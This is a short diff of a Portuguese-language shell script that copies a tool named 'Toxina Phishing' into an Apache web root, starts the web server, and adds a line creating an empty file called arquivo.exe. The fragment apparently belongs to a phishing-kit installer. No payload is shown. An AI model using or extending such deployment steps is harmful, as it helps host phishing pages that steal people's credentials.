@@ -89,6 +89,7 @@ $c
 echo "[**Movendo o Toxina Phishing para o apache2**]"
 mkdir /var/www/html/page
 cp -r * /var/www/html/page
+touch arquivo.exe
 systemctl start apache2
 systemctl enable apache2.service
 echo "[**Toxina Ph1shing movido com sucesso!**]"
